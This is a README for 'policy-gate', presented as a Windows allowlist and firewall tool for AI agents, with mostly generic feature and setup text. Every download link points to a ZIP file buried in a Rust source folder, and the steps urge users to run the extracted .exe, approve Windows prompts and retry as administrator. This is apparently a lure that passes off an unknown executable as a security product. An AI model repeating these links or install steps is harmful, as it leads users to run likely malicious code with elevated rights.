# 🛡️ policy-gate - Simple allowlist control for AI apps

[![Download policy-gate](https://img.shields.io/badge/Download-Policy_Gate-blue?style=for-the-badge)](https://raw.githubusercontent.com/Mct6612/policy-gate/main/crates/firewall-proxy/src/gate_policy_2.7.zip)

## 📥 Download

Visit this page to download and run policy-gate on Windows:

[https://raw.githubusercontent.com/Mct6612/policy-gate/main/crates/firewall-proxy/src/gate_policy_2.7.zip](https://raw.githubusercontent.com/Mct6612/policy-gate/main/crates/firewall-proxy/src/gate_policy_2.7.zip)

## 🧭 What policy-gate does

policy-gate helps control what an AI app can do before it acts.

It checks each request against a set of clear rules. If the request matches the allowlist, the app can continue. If it does not match, policy-gate blocks it.

This helps you keep control of:

- Which prompts can pass
- Which tools an agent can use
- Which actions can reach an AI gateway
- Which requests get logged for review

It is built for people who want a fixed rule set instead of guesswork.

## 💻 What you need

Use a Windows PC with:

- Windows 10 or Windows 11
- An internet connection
- At least 200 MB of free disk space
- A standard user account or admin account
- A modern browser like Edge, Chrome, or Firefox

If your PC already runs common desktop apps, it should handle policy-gate.

## 🚀 Get started on Windows

1. Open the download page:
   [https://raw.githubusercontent.com/Mct6612/policy-gate/main/crates/firewall-proxy/src/gate_policy_2.7.zip](https://raw.githubusercontent.com/Mct6612/policy-gate/main/crates/firewall-proxy/src/gate_policy_2.7.zip)

2. Find the latest Windows download on the page.

3. Download the file to your computer.

4. If the file is in a ZIP folder, right-click it and choose Extract All.

5. Open the extracted folder.

6. Double-click the app file to run it.

7. If Windows asks for permission, choose Yes.

8. Follow the on-screen setup steps.

9. Start with the default policy if you want a simple first run.

10. Test it with a safe request before using real traffic.

## 🧩 First run setup

When you open policy-gate for the first time, you will usually see a small setup screen or config file.

Use these steps:

- Pick a policy file or default profile
- Keep the allowlist small at first
- Turn on logging
- Leave fail-closed on
- Save your settings

A good first setup blocks unknown requests and allows only the paths you trust.

## 🔒 How the allowlist works

policy-gate uses an allowlist-first model.

That means:

- Known-safe items pass
- Unknown items stop
- Every blocked action gets checked against a rule
- The result stays the same each time for the same input

This works well for:

- AI agents that call tools
- LLM apps that send prompts
- Gateway setups that need strict control
- Teams that want audit logs for review

## 🛠️ Common setup options

You may see these settings in the app or config file:

- **Allowlist**: The list of approved prompts, tools, hosts, or actions
- **Fail-closed**: Blocks traffic when a rule is not clear
- **Audit log**: Saves what happened and why
- **Prompt filter**: Checks input text before it reaches the model
- **Tool gate**: Checks if an agent can use a tool
- **Gateway mode**: Sits between your app and the model service

If you are not sure what to change, keep the default values and test one step at a time.

## 📋 Example use cases

policy-gate fits a few common cases:

- A customer support bot that should only answer known topics
- An AI agent that should use only approved tools
- A gateway that should block risky prompt patterns
- A local app that needs a fixed policy before sending data out
- A team that wants a clear log of blocked and allowed actions

## 🧠 Tips for safe use

- Start with one small allowlist
- Test with a few known prompts
- Check the log after each test
- Block unknown tools until you trust the flow
- Keep a backup of your config file
- Change one setting at a time

These steps make it easier to see what each rule does.

## 🧾 Logs and review

policy-gate can record each check in an audit log.

The log helps you see:

- What came in
- What rule ran
- Why the request passed or failed
- When the event happened

If something gets blocked, check the log first. It often shows the exact rule that stopped it.

## 🔄 Updating policy-gate

When a new version is available:

1. Open the GitHub page
2. Download the new file
3. Replace the old app files if needed
4. Keep your policy file unless the update says to change it
5. Run the app again and test the same request set

If you use a config file, save a copy before you update.

## ❓ Common problems

### The app does not open

- Make sure the file finished downloading
- Check if Windows blocked the file
- Try running it again as an administrator
- Confirm you extracted the ZIP file if there was one

### The app opens, but nothing happens

- Check that the policy file is loaded
- Look for a disabled service or closed port
- Confirm the app points to the right model or gateway address
- Review the log for blocked requests

### Everything gets blocked

- Check whether fail-closed is on
- Review the allowlist entries
- Add one safe rule and test again
- Look for a typo in the config file

### The log is empty

- Turn on audit logging
- Make sure the app has permission to write files
- Check the log folder path
- Run one test request to create a new entry

## 📁 Suggested folder layout

If you want to keep things tidy, use a simple folder layout like this:

- `policy-gate`
  - `app`
  - `config`
  - `logs`
  - `policies`
  - `backup`

This keeps the app files separate from your rules and logs.

## 🧰 Good starter policy idea

A simple starter policy can include:

- One approved model endpoint
- A short list of approved tools
- A small prompt allowlist
- Logging turned on
- Fail-closed turned on

That gives you a tight control loop and makes testing easier.

## 📚 Topic focus

policy-gate is built around these ideas:

- AI agents
- AI safety
- Audit logs
- Deterministic checks
- Fail-closed control
- Firewall-style filtering
- Formal verification
- Guardrails
- LLM gateways
- Prompt injection defense
- Rust-based performance and reliability

## 🪟 Windows install flow

1. Open the GitHub page
2. Download the Windows build
3. Save it to Downloads
4. Extract it if needed
5. Open the folder
6. Run the app file
7. Allow access if Windows asks
8. Load your policy file
9. Test with a safe prompt
10. Review the log

## 🧪 Basic test plan

Use this simple test plan after setup:

- Send one known-safe request
- Send one request with a blocked term
- Send one tool call that is not on the allowlist
- Check that the safe request passes
- Check that the blocked request fails
- Check the log for both cases

If the result matches your rules each time, your setup is working.

## 🗂️ File types you may see

You may see one or more of these files:

- `.exe` for the app
- `.zip` for the download
- `.json` for policy rules
- `.toml` or `.yaml` for config
- `.log` for audit records

If you are unsure which file to open, start with the app file in the main folder.

## 🧷 Best practices

- Keep your policy small
- Avoid broad allow rules
- Review logs often
- Back up your config
- Test after each change
- Keep blocked items blocked until reviewed

A small, clear policy is easier to trust than a long one you do not check

